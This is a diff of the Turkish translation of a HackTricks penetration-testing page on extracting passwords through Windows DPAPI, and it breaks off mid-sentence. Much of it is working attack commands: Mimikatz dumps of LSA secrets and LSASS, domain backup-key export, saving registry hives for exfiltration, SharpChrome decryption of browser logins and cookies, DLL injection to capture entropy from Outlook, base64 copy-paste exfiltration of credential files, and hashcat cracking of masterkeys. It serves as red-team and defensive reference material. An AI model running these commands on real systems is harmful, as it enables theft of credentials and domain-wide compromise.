@@ -1,33 +1,33 @@
-# DPAPI - Extracting Passwords
+# DPAPI - Parolaları Çıkarma
 
 {{#include ../../banners/hacktricks-training.md}}
 
 
 
-## What is DPAPI
+## DPAPI nedir
 
-The Data Protection API (DPAPI) is primarily utilized within the Windows operating system for the **symmetric encryption of asymmetric private keys**, leveraging either user or system secrets as a significant source of entropy. This approach simplifies encryption for developers by enabling them to encrypt data using a key derived from the user's logon secrets or, for system encryption, the system's domain authentication secrets, thus obviating the need for developers to manage the protection of the encryption key themselves.
+The Data Protection API (DPAPI) esas olarak Windows işletim sistemi içinde **asimetrik özel anahtarların simetrik şifrelenmesi** için kullanılır; burada kullanıcı veya sistem sırları önemli bir entropi kaynağı olarak kullanılır. Bu yaklaşım geliştiriciler için şifrelemeyi basitleştirir: veriyi, kullanıcının oturum açma sırlarından türetilen bir anahtarla veya sistem şifrelemesi için sistemin domain kimlik doğrulama sırlarıyla şifreleyerek geliştiricinin şifreleme anahtarının korunmasını kendisinin yönetmesine gerek kalmaz.
 
-The most common way to use DPAPI is through the **`CryptProtectData` and `CryptUnprotectData`** functions, which allow applications to encrypt and decrypt data securely with the session of the process that is currently logged on. This means that the encrypted data can only be decrypted by the same user or system that encrypted it.
+DPAPI'yi kullanmanın en yaygın yolu **`CryptProtectData` ve `CryptUnprotectData`** fonksiyonlarıdır; bu fonksiyonlar uygulamaların veriyi, o anda oturum açmış olan işlemin oturumuyla güvenli şekilde şifreleyip çözmesine olanak tanır. Bu, şifrelenmiş verinin yalnızca aynı kullanıcı veya sistem tarafından çözülebileceği anlamına gelir.
 
-Moreover, these functions accepts also an **`entropy` parameter** which will also be used during encryption and decryption, therefore, in order to decrypt something encrypted using this parameter, you must provide the same entropy value that was used during encryption.
+Ayrıca, bu fonksiyonlar şifreleme ve şifre çözme sırasında kullanılacak bir **`entropy` parameter** alır; bu nedenle, bu parametre kullanılarak şifrelenmiş bir şeyi çözmek istiyorsanız, şifreleme sırasında kullanılan aynı entropy değerini vermeniz gerekir.
 
-### Users key generation
+### Kullanıcı anahtarının oluşturulması
 
-DPAPI, her kullanıcı için kimlik bilgilerine dayalı olarak benzersiz bir anahtar (called **`pre-key`**) oluşturur. Bu anahtar kullanıcının parolasından ve diğer faktörlerden türetilir ve algoritma kullanıcı türüne bağlıdır ancak sonuçta bir SHA1 olur. Örneğin, domain kullanıcıları için **it depends on the NTLM hash of the user**.
+DPAPI, her kullanıcı için kimlik bilgilerine dayalı benzersiz bir anahtar (buna **`pre-key`** denir) oluşturur. Bu anahtar kullanıcının parolasından ve diğer faktörlerden türetilir ve algoritma kullanıcı türüne bağlıdır, ancak sonuçta bir SHA1 olur. Örneğin, domain kullanıcıları için **kullanıcının NTLM hash'ine bağlıdır**.
 
-Bu özellikle ilginçtir çünkü bir saldırgan kullanıcının parola hash'ini elde edebilirse:
+Bu özellikle ilginçtir çünkü bir saldırgan kullanıcının parola hash'ini ele geçirebilirse:
 
-- **Decrypt any data that was encrypted using DPAPI** with that user's key without needing to contact any API
-- Try to **crack the password** offline trying to generate the valid DPAPI key
+- Kullanıcının anahtarıyla DPAPI kullanılarak şifrelenmiş herhangi bir veriyi **API ile iletişime geçmeye gerek kalmadan çözebilir**
+- Geçerli DPAPI anahtarını üretmeye çalışarak parolayı **çevrimdışı kırmayı** deneyebilir
 
-Ayrıca, bir kullanıcı DPAPI kullanarak veri şifrelediğinde her seferinde yeni bir **master key** oluşturulur. Bu master key, veriyi gerçekten şifrelemek için kullanılan anahtardır. Her master key'e onu tanımlayan bir **GUID** atanır.
+Ayrıca, bir kullanıcı DPAPI kullanarak her veri şifrelediğinde yeni bir **master key** oluşturulur. Bu master key aslında veriyi şifrelemek için kullanılır. Her master key bir **GUID** (Globally Unique Identifier) ile tanımlanır.
 
-Master key'ler **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** dizininde saklanır; burada `{SID}` o kullanıcının Security Identifier'ıdır. Master key, kullanıcının **`pre-key`**'i tarafından ve kurtarma için bir **domain backup key** tarafından şifrelenmiş olarak saklanır (yani aynı anahtar iki farklı yolla iki kere şifrelenmiş olur).
+Master key'ler **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** dizininde saklanır; burada `{SID}` o kullanıcının Security Identifier'ıdır. Master key, kullanıcının **`pre-key`**'iyle ve kurtarma için bir **domain backup key** ile şifrelenmiş olarak saklanır (yani aynı anahtar iki farklı yol ile şifrelenmiş şekilde saklanır).
 
-Not: Master key'i şifrelemek için kullanılan **domain key** etki alanı denetleyicilerinde bulunur ve asla değişmez; bu yüzden bir saldırgan domain controller'a erişimi varsa domain backup key'i alıp tüm domain kullanıcılarının master key'lerini çözebilir.
+Dikkat edin ki master key'i şifrelemek için kullanılan **domain key domain controller'larda bulunur ve asla değişmez**, bu yüzden bir saldırgan domain controller'a erişebilirse domain backup key'i alıp domain içindeki tüm kullanıcıların master key'lerini çözebilir.
 
-Şifrelenmiş blob'lar, başlıklarında veriyi şifrelemek için kullanılan **master key'in GUID**'ini içerir.
+Şifrelenmiş blob'lar, içlerindeki veriyi şifrelemek için kullanılan master key'in **GUID**'ini başlıklarında içerir.
 
 > [!TIP]
 > DPAPI encrypted blobs starts with **`01 00 00 00`**
@@ -41,49 +41,49 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-This is what a bunch of Master Keys of a user will looks like:
+Bir kullanıcının birkaç Master Key'inin nasıl göründüğüne örnek:
 
 ![](<../../images/image (1121).png>)
 
-### Makine/Sistem anahtar üretimi
+### Makine/Sistem anahtar oluşturma
 
-Bu, makinenin veriyi şifrelemek için kullandığı anahtardır. **DPAPI_SYSTEM LSA secret**'e dayanır; bu, yalnızca SYSTEM kullanıcısının erişebildiği özel bir anahtardır. Bu anahtar, makine düzeyindeki kimlik bilgileri veya sistem genelindeki gizli veriler gibi, sistemin kendisi tarafından erişilmesi gereken verileri şifrelemek için kullanılır.
+Bu, makinenin verileri şifrelemesi için kullanılan anahtardır. **DPAPI_SYSTEM LSA secret**'a dayanır; yalnızca SYSTEM kullanıcısının erişebildiği özel bir anahtardır. Bu anahtar, makine düzeyindeki kimlik bilgileri veya sistem genelindeki sırlar gibi sistem tarafından erişilmesi gereken verileri şifrelemek için kullanılır.
 
-Bu anahtarların **domain yedeği yoktur**, bu yüzden yalnızca yerel olarak erişilebilirler:
+Not: bu anahtarların **etki alanı yedeği yoktur**, bu yüzden yalnızca yerel olarak erişilebilir:
 
-- **Mimikatz**, LSA secret'lerini dump'layarak şu komutla erişebilir: `mimikatz lsadump::secrets`
-- Gizli değer kayıt defterinde saklanır, bu yüzden bir yönetici erişim için **DACL izinlerini değiştirebilir**. Kayıt yolu: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
-- Kayıt defteri hives'lerinden çevrimdışı çıkarım da mümkündür. Örneğin, hedefte yönetici olarak hives'leri kaydedip exfiltrate edebilirsiniz:
+- **Mimikatz**, `mimikatz lsadump::secrets` komutuyla LSA secrets'ları dump ederek buna erişebilir.
+- Gizli bilgi kayıt defterinde saklanır; bu yüzden bir yönetici **DACL izinlerini değiştirerek buna erişebilir**. Kayıt defteri yolu: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
+- Registry hive'lerinden çevrimdışı çıkarım da mümkündür. Örneğin, hedefte yönetici olarak hive'leri kaydedip exfiltrate edebilirsiniz:
 ```cmd
 reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
 reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
 ```
-Ardından analiz kutunuzda, hive'lerden DPAPI_SYSTEM LSA secret'ini kurtarın ve bunu makine kapsamındaki blob'ların (zamanlanmış görev parolaları, servis kimlik bilgileri, Wi‑Fi profilleri vb.) şifresini çözmek için kullanın:
+Daha sonra analysis box'unuzda hivelardan DPAPI_SYSTEM LSA secret'ini kurtarın ve bunu machine-scope blobs'ların (scheduled task passwords, service credentials, Wi‑Fi profiles vb.) şifrelerini çözmek için kullanın:
 ```text
 mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
 # Look for the DPAPI_SYSTEM secret in the output
 ```
-### DPAPI tarafından korunan veriler
+### Protected Data by DPAPI
 
-Arasında DPAPI tarafından korunan kişisel veriler şunlardır:
+Among the personal data protected by DPAPI are:
 
 - Windows creds
-- Internet Explorer ve Google Chrome'un parolaları ve otomatik tamamlama verileri
+- Internet Explorer ve Google Chrome parolaları ile otomatik tamamlama verileri
 - Outlook ve Windows Mail gibi uygulamalar için e-posta ve dahili FTP hesap parolaları
-- Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault için parolalar, şifreleme anahtarları dahil
-- Uzaktan masaüstü bağlantıları, .NET Passport ve çeşitli şifreleme ve kimlik doğrulama amaçları için özel anahtarlar
+- Paylaşılan klasörler, kaynaklar, kablosuz ağlar ve Windows Vault için parolalar (şifreleme anahtarları dahil)
+- Uzak masaüstü bağlantıları, .NET Passport ve çeşitli şifreleme/kimlik doğrulama amaçları için özel anahtarlar ve parolalar
 - Credential Manager tarafından yönetilen ağ parolaları ve CryptProtectData kullanan uygulamalardaki kişisel veriler (ör. Skype, MSN messenger vb.)
-- Kayıt defterindeki şifrelenmiş blob'lar
+- Register içindeki şifrelenmiş blob'lar
 - ...
 
-Sistem tarafından korunan veriler şunları içerir:
+System protected data includes:
 - Wifi parolaları
 - Zamanlanmış görev parolaları
 - ...
 
-### Master key çıkarma seçenekleri
+### Master key extraction options
 
-- Eğer kullanıcı domain admin ayrıcalıklarına sahipse, etki alanındaki tüm kullanıcı master key'lerini çözmek için **domain backup key**'e erişebilir:
+- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
 ```bash
 # Mimikatz
 lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
@@ -91,17 +91,17 @@ lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
 # SharpDPAPI
 SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
 ```
-- Yerel yönetici ayrıcalıklarıyla, bağlı tüm kullanıcıların DPAPI master keys'lerini ve SYSTEM key'ini çıkarmak için **LSASS memory**'e erişmek mümkündür.
+- Yerel admin ayrıcalıklarıyla, bağlı tüm kullanıcıların DPAPI ana anahtarlarını ve SYSTEM anahtarını çıkarmak için **LSASS belleğine erişmek** mümkündür.
 ```bash
 # Mimikatz
 mimikatz sekurlsa::dpapi
 ```
-- Eğer kullanıcı yerel admin ayrıcalıklarına sahipse, **DPAPI_SYSTEM LSA secret**'e erişerek makinenin master anahtarlarını çözebilir:
+- Kullanıcının local admin privileges varsa, **DPAPI_SYSTEM LSA secret**'e erişip machine master keys'in şifrelerini çözebilirler:
 ```bash
 # Mimikatz
 lsadump::secrets /system:DPAPI_SYSTEM /export
 ```
-- Eğer kullanıcının password veya NTLM hash'i biliniyorsa, kullanıcıya ait master keys'i doğrudan **decrypt** edebilirsiniz:
+- Kullanıcının parolası veya NTLM hash'i biliniyorsa, **kullanıcıya ait master anahtarlarını doğrudan şifre çözebilirsiniz**:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected
@@ -109,7 +109,7 @@ dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /password:PASSWORD
 ```
-- Eğer kullanıcı olarak bir session içindeyseniz, DC'den **backup key to decrypt the master keys using RPC** istemek mümkündür. Eğer local admin iseniz ve kullanıcı logged in ise, bunun için **steal his session token** yapabilirsiniz:
+- Eğer kullanıcı olarak bir oturum içindeyseniz, DC'den **backup key to decrypt the master keys using RPC** isteyebilirsiniz. Eğer local admin iseniz ve kullanıcı oturum açmışsa, bunun için **steal his session token** yapabilirsiniz:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -117,7 +117,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-## Vault'ları Listele
+## Vault'ı Listele
 ```bash
 # From cmd
 vaultcmd /listcreds:"Windows Credentials" /all
@@ -129,12 +129,12 @@ mimikatz vault::list
 
 ### DPAPI Şifrelenmiş verileri bul
 
-Kullanıcıların yaygın olarak **korunan dosyaları** şunlardadır:
+Kullanıcıların yaygın **korunan dosyaları** şunlardadır:
 
 - `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
-- Check also changing `\Roaming\` to `\Local\` in the above paths.
+- Ayrıca yukarıdaki yollarda `\Roaming\` yerine `\Local\` kullanmayı da kontrol edin.
 
 Enumeration examples:
 ```bash
@@ -143,7 +143,7 @@ dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) file system, registry ve B64 blobs içinde DPAPI encrypted blobs bulabilir:
+[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) dosya sisteminde, registry'de ve B64 blob'larında DPAPI ile şifrelenmiş blob'ları bulabilir:
 ```bash
 # Search blobs in the registry
 search /type:registry [/path:HKLM] # Search complete registry by default
@@ -158,39 +158,39 @@ search /type:file /path:C:\path\to\file
 # Search a blob inside B64 encoded data
 search /type:base64 [/base:<base64 string>]
 ```
-Şunu unutmayın ki [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aynı repo'dan) DPAPI kullanarak cookies gibi hassas verilerin şifresini çözmek için kullanılabilir.
+Note that [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (aynı repo'dan) DPAPI kullanarak cookies gibi hassas verileri şifre çözmek için kullanılabilir.
 
-#### Chromium/Edge/Electron quick recipes (SharpChrome)
+#### Chromium/Edge/Electron hızlı yöntemler (SharpChrome)
 
-- Mevcut kullanıcı, kaydedilmiş logins/cookies'in etkileşimli şifre çözümü (Chrome 127+ app-bound cookies ile bile çalışır çünkü ek anahtar, kullanıcı bağlamında çalıştırılırken kullanıcının Credential Manager'ından çözülür):
+- Mevcut kullanıcı, kaydedilmiş logins/cookies'ın etkileşimli şifre çözümü (Chrome 127+ app-bound cookies ile bile çalışır çünkü ekstra anahtar kullanıcı bağlamında çalıştırıldığında kullanıcının Credential Manager'ından çözülür):
 ```cmd
 SharpChrome logins  /browser:edge  /unprotect
 SharpChrome cookies /browser:chrome /format:csv /unprotect
 ```
-- Sadece dosyalar varken çevrimdışı analiz. Önce profilin "Local State" dosyasından AES state key'i çıkarın ve ardından cookie DB'nin şifresini çözmek için kullanın:
+- Sadece dosyalarınız olduğunda yapılan Offline analysis. İlk olarak profilin "Local State" dosyasından AES state key'i çıkarın ve ardından cookie DB'yi decrypt etmek için kullanın:
 ```cmd
 # Dump the AES state key from Local State (DPAPI will be used if running as the user)
 SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
 # Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
 SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
 ```
-- DPAPI domain backup key (PVK) ve hedef hostta admin olduğunuzda domain genelinde/uzaktan triage:
+- Domain-genelinde/uzaktan triage, DPAPI domain backup key (PVK) ve target host üzerinde admin olduğunuzda:
 ```cmd
 SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
 SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
 ```
-- Eğer bir kullanıcının DPAPI prekey/credkey (LSASS'tan) varsa, password cracking'i atlayıp profil verilerini doğrudan decrypt edebilirsiniz:
+- Eğer bir kullanıcının DPAPI prekey/credkey (LSASS'den) elinizdeyse, password cracking'i atlayıp profile data'yı doğrudan decrypt edebilirsiniz:
 ```cmd
 # For SharpChrome use /prekey; for SharpDPAPI use /credkey
 SharpChrome cookies /browser:edge /prekey:SHA1_HEX
 SharpDPAPI.exe credentials /credkey:SHA1_HEX
 ```
 Notlar
-- Daha yeni Chrome/Edge sürümleri bazı çerezleri "App-Bound" şifreleme kullanarak depolayabilir. Bu belirli çerezlerin çevrimdışı şifre çözümü, ek app-bound key olmadan mümkün değildir; otomatik olarak almak için SharpChrome'u hedef kullanıcı bağlamında çalıştırın. Aşağıda referans verilen Chrome güvenlik blog yazısına bakın.
+- Yeni Chrome/Edge sürümleri bazı çerezleri "App-Bound" şifreleme kullanarak saklayabilir. Bu belirli çerezlerin çevrimdışı olarak çözümlenmesi ek app-bound key olmadan mümkün değildir; SharpChrome'u hedef kullanıcı bağlamında çalıştırın; böylece anahtar otomatik olarak alınır. Aşağıda referans verilen Chrome güvenlik blog gönderisine bakın.
 
 ### Erişim anahtarları ve veriler
 
-- **SharpDPAPI'yi kullanın** mevcut oturumdan DPAPI ile şifrelenmiş dosyalardan kimlik bilgilerini almak için:
+- **SharpDPAPI'yi kullanın** mevcut oturumdaki DPAPI ile şifrelenmiş dosyalardan kimlik bilgilerini almak için:
 ```bash
 # Decrypt user data
 ## Note that 'triage' is like running credentials, vaults, rdg and certificates
@@ -199,7 +199,7 @@ SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect
 # Decrypt machine data
 SharpDPAPI.exe machinetriage
 ```
-- **Kimlik bilgileriyle ilgili bilgi alın**, örneğin şifrelenmiş veri ve guidMasterKey.
+- **credentials bilgilerini edinin** (encrypted data ve guidMasterKey gibi).
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
 
@@ -209,9 +209,9 @@ guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
 pbData             : b8f619[...snip...]b493fe
 [..]
 ```
-- **masterkeys'e erişim**:
+- **Access masterkeys**:
 
-RPC kullanarak **domain backup key** isteyen bir kullanıcının masterkey'ini çöz:
+RPC kullanarak **domain backup key** talep eden bir kullanıcının masterkey'ini decrypt edin:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -219,7 +219,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-Bu **SharpDPAPI** aracı ayrıca masterkey şifresinin çözülmesi için şu argümanları destekler ( `/rpc` kullanılarak etki alanının yedek anahtarının alınabileceğine, `/password` ile düz metin bir şifrenin kullanılabileceğine veya `/pvk` ile bir DPAPI etki alanı özel anahtar dosyasının belirtilebileceğine dikkat edin...):
+**SharpDPAPI** aracı ayrıca masterkey şifre çözümü için bu argümanları destekler (örneğin `/rpc` ile domain'in yedek anahtarını almak, `/password` ile düz metin parola kullanmak veya `/pvk` ile bir DPAPI domain özel anahtar dosyası belirtmek mümkündür...):
 ```
 /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
 /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
@@ -231,7 +231,7 @@ Bu **SharpDPAPI** aracı ayrıca masterkey şifresinin çözülmesi için şu ar
 /server:SERVER          -   triage a remote server, assuming admin access
 /hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
 ```
-- **Decrypt data using a masterkey**:
+- **Masterkey kullanarak veriyi şifre çözme**:
 ```bash
 # Mimikatz
 dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
@@ -239,7 +239,7 @@ dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
 # SharpDPAPI
 SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
 ```
-The **SharpDPAPI** aracı ayrıca `credentials|vaults|rdg|keepass|triage|blob|ps` şifre çözme için bu argümanları destekler (örneğin `/rpc` ile etki alanının yedekleme anahtarını almak, `/password` ile düz metin parolayı kullanmak, `/pvk` ile bir DPAPI etki alanı özel anahtar dosyası belirtmek, `/unprotect` ile geçerli kullanıcının oturumunu kullanmak mümkün...):
+The **SharpDPAPI** aracı ayrıca `credentials|vaults|rdg|keepass|triage|blob|ps` şifre çözme için şu argümanları destekler (örneğin `/rpc` ile domain'in yedek anahtarını almak, `/password` ile düz metin parola kullanmak, `/pvk` ile bir DPAPI domain özel anahtar dosyası belirtmek, `/unprotect` ile mevcut kullanıcının oturumunu kullanmak mümkün...):
 ```
 Decryption:
 /unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
@@ -258,9 +258,9 @@ Targeting:
 Note: must use with /pvk:KEY or /password:X
 Note: not applicable to 'blob' or 'ps' commands
 ```
-- Doğrudan bir DPAPI prekey/credkey kullanma (şifre gerekmez)
+- DPAPI prekey/credkey'i doğrudan kullanmak (no password needed)
 
-Eğer LSASS'i dump edebiliyorsanız, Mimikatz genellikle bir per-logon DPAPI key ortaya çıkarır; bu anahtar, kullanıcının masterkeys'lerini plaintext password'u bilmeden decrypt etmek için kullanılabilir. Bu değeri doğrudan tooling'e verin:
+Eğer LSASS'i dump edebiliyorsanız, Mimikatz genellikle kullanıcı için per-logon DPAPI key'i açığa çıkarır; bu key, plaintext password'u bilmeden kullanıcının masterkeys'lerini decrypt etmek için kullanılabilir. Bu değeri doğrudan tooling'e verin:
 ```cmd
 # SharpDPAPI accepts the "credkey" (domain or local SHA1)
 SharpDPAPI.exe triage /credkey:SHA1_HEX
@@ -268,7 +268,7 @@ SharpDPAPI.exe triage /credkey:SHA1_HEX
 # SharpChrome accepts the same value as a "prekey"
 SharpChrome logins /browser:edge /prekey:SHA1_HEX
 ```
-- **Mevcut kullanıcı oturumunu** kullanarak bazı verilerin şifresini çöz:
+- Bazı verileri **geçerli kullanıcı oturumu** kullanarak Decrypt et:
 ```bash
 # Mimikatz
 dpapi::blob /in:C:\path\to\encrypted\file /unprotect
@@ -280,19 +280,19 @@ SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
 
 ### Impacket dpapi.py ile çevrimdışı şifre çözme
 
-Hedef kullanıcının SID'ine ve parolasına (veya NT hash'ine) sahipseniz, DPAPI masterkey'lerini ve Credential Manager blob'larını tamamen çevrimdışı olarak Impacket dpapi.py ile çözebilirsiniz.
+Eğer hedef kullanıcının SID'ine ve parolasına (veya NT hash'ine) sahipseniz, Impacket’in dpapi.py aracını kullanarak DPAPI masterkey'lerini ve Credential Manager blob'larını tamamen çevrimdışı olarak çözebilirsiniz.
 
 - Diskteki artefaktları belirleyin:
 - Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
-- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}
+- Eşleşen masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}
 
-- Dosya transfer araçları güvenilmezse, dosyaları host üzerinde base64 ile kodlayıp çıktıyı kopyalayın:
+- Dosya transfer araçları güvenilmezse, dosyaları hedef makinede base64 ile kodlayıp çıktıyı kopyalayın:
 ```powershell
 # Base64-encode files for copy/paste exfil
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
 [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
 ```
-- Kullanıcının SID'i ve password/hash'i ile masterkey'i decrypt et:
+- Kullanıcının SID'i ve parola/hash'i ile masterkey'i deşifre et:
 ```bash
 # Plaintext password
 python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
@@ -302,21 +302,21 @@ python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
 python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
 -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
 ```
-- Şifresi çözülmüş masterkey'i kullanarak credential blob'u deşifre edin:
+- Çözülen masterkey'i kullanarak credential blob'u dekripte edin:
 ```bash
 python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
 # Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
 # Username=<user> ; Password=<cleartext>
 ```
-Bu iş akışı, Windows Credential Manager kullanan uygulamalar tarafından kaydedilmiş etki alanı kimlik bilgilerini sıklıkla kurtarır; buna yönetici hesaplar (ör., `*_adm`) da dahildir.
+Bu çalışma akışı genellikle Windows Credential Manager kullanan uygulamalar tarafından kaydedilen etki alanı kimlik bilgilerini geri getirir; bunlar arasında yönetici hesapları da bulunur (örn. `*_adm`).
 
 ---
 
-### Opsiyonel Entropinin İşlenmesi ("Üçüncü taraf entropisi")
+### Opsiyonel Entropy'nin İşlenmesi ("Third-party entropy")
 
-Bazı uygulamalar `CryptProtectData`'a ek bir **entropy** değeri gönderir. Bu değer olmadan, doğru masterkey bilinse bile blob çözülemez. Bu nedenle entropinin elde edilmesi, bu yolla korunmuş kimlik bilgilerini hedeflerken (ör. Microsoft Outlook, bazı VPN istemcileri) elzemdir.
+Bazı uygulamalar `CryptProtectData`'ya ek bir **entropy** değeri iletir. Doğru masterkey bilinse bile, bu değer olmadan blob şifre çözülemez. Bu nedenle, Microsoft Outlook veya bazı VPN istemcileri gibi bu şekilde korunan kimlik bilgileri hedeflendiğinde entropy'nin elde edilmesi zorunludur.
 
-[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) hedef süreç içindeki DPAPI fonksiyonlarına hook yapan bir user-mode DLL'dir ve sağlanan herhangi bir opsiyonel entropiyi şeffaf şekilde kaydeder. EntropyCapture'ı **DLL-injection** modunda `outlook.exe` veya `vpnclient.exe` gibi süreçlere karşı çalıştırmak, her entropi tamponunu çağıran süreç ve blob ile eşleyen bir dosya üretecektir. Yakalanan entropi daha sonra veriyi çözmek için **SharpDPAPI** (`/entropy:`) veya **Mimikatz** (`/entropy:<file>`)'e sağlanabilir.
+[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) hedef süreç içindeki DPAPI fonksiyonlarını hook'layan bir user-mode DLL'dir ve sağlanan herhangi bir opsiyonel entropy'yi şeffaf şekilde kaydeder. EntropyCapture'ı `outlook.exe` veya `vpnclient.exe` gibi süreçlere karşı **DLL-injection** modunda çalıştırmak, her entropy buffer'ını çağıran süreç ve blob ile eşleyen bir dosya oluşturur. Yakalanan entropy daha sonra veriyi şifre çözmek için **SharpDPAPI** (`/entropy:`) veya **Mimikatz** (`/entropy:<file>`) ile sağlanabilir.
 ```powershell
 # Inject EntropyCapture into the current user's Outlook
 InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
@@ -324,9 +324,9 @@ InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
 # Later decrypt a credential blob that required entropy
 SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
 ```
-### Masterkey'leri çevrimdışı kırma (Hashcat & DPAPISnoop)
+### Cracking masterkeys offline (Hashcat & DPAPISnoop)
 
-Microsoft, Windows 10 v1607 (2016) ile başlayan sürümlerde **context 3** masterkey formatını tanıttı. `hashcat` v6.2.6 (Aralık 2023), masterkey dosyasından kullanıcı şifrelerinin doğrudan GPU hızlandırmalı kırılmasına izin veren hash-modları **22100** (DPAPI masterkey v1 context), **22101** (context 1) ve **22102** (context 3) ekledi. Bu sayede saldırganlar hedef sistemle etkileşime girmeden wordlist veya brute-force saldırıları gerçekleştirebilir.
+Microsoft, Windows 10 v1607 (2016) ile başlayarak **context 3** masterkey formatını tanıttı. `hashcat` v6.2.6 (December 2023) hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) ve **22102** (context 3) ekleyerek kullanıcı parolalarının masterkey dosyasından doğrudan GPU hızlandırmalı kırılmasına izin verdi. Bu sayede saldırganlar hedef sistemle etkileşime girmeden word-list veya brute-force saldırıları gerçekleştirebilir.
 
 `DPAPISnoop` (2024) süreci otomatikleştirir:
 ```bash
@@ -334,11 +334,11 @@ Microsoft, Windows 10 v1607 (2016) ile başlayan sürümlerde **context 3** mast
 DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
 hashcat -m 22102 bob.hc wordlist.txt -O -w4
 ```
-Araç ayrıca Credential ve Vault blob'larını parse edip, kırılmış anahtarlarla decrypt ederek cleartext parolaları export edebilir.
+Araç ayrıca Credential and Vault blobs öğelerini ayrıştırıp kırılmış anahtarlarla şifrelerini çözüp düz metin parolaları dışa aktarabilir.
 
 ### Diğer makine verilerine erişim
 
-Uzak bir makinenin verilerine erişmek için **SharpDPAPI ve SharpChrome** içinde **`/server:HOST`** seçeneğini kullanabilirsiniz. Elbette o makineye erişebilmeniz gerekir ve aşağıdaki örnekte **domain backup encryption key is known** varsayılmaktadır:
